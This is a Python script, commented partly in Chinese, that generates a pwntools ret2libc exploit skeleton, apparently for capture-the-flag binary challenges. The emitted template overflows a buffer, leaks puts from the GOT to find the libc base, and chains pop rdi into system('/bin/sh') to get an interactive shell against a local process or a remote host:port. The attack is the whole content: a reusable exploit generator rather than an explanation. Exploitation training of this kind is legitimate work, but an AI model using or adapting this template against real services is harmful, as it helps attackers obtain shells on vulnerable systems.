#!/usr/bin/env python3
"""ROP Template — ret2libc / ret2csu 快速构建模板.

Usage:
    python3 rop_template.py <binary> [libc] [--remote HOST:PORT]

Generates a skeleton exploit script to stdout.
"""
import sys

TEMPLATE = '''#!/usr/bin/env python3
from pwn import *

# === Config ===
binary_path = "{binary}"
libc_path = "{libc}"  # 如有
context.binary = elf = ELF(binary_path)
if libc_path:
    libc = ELF(libc_path)

def conn():
    if args.REMOTE:
        return remote("{host}", {port})
    return process(elf.path)

r = conn()

# === Gadgets ===
rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]                    # stack alignment
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]     # 第一参数

# === Stage 1: Leak libc ===
payload = b"A" * OFFSET  # 替换 OFFSET 为实际偏移
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])   # leak puts@GOT
payload += p64(elf.plt['puts'])   # call puts
payload += p64(elf.sym['main'])   # return to main

r.sendlineafter(b"> ", payload)   # 根据实际交互调整

leak = u64(r.recvline().strip().ljust(8, b"\\x00"))
log.info(f"puts leak: {{hex(leak)}}")

# === Calculate libc base ===
if libc_path:
    libc.address = leak - libc.sym['puts']
    log.info(f"libc base: {{hex(libc.address)}}")
    system = libc.sym['system']
    bin_sh = next(libc.search(b'/bin/sh'))
else:
    # 无 libc 时用 LibcSearcher 或手动查
    # from LibcSearcher import LibcSearcher
    # obj = LibcSearcher('puts', leak)
    # libc_base = leak - obj.dump('puts')
    # system = libc_base + obj.dump('system')
    # bin_sh = libc_base + obj.dump('str_bin_sh')
    pass

# === Stage 2: system("/bin/sh") ===
payload2 = b"A" * OFFSET
payload2 += p64(ret)        # alignment
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system)

r.sendlineafter(b"> ", payload2)
r.interactive()
'''

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    binary = sys.argv[1]
    libc = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].startswith("--") else ""
    host, port = "host", 9999
    for arg in sys.argv:
        if arg.startswith("--remote"):
            hp = sys.argv[sys.argv.index(arg) + 1]
            host, port = hp.split(":")
            break

    print(TEMPLATE.format(binary=binary, libc=libc, host=host, port=port))
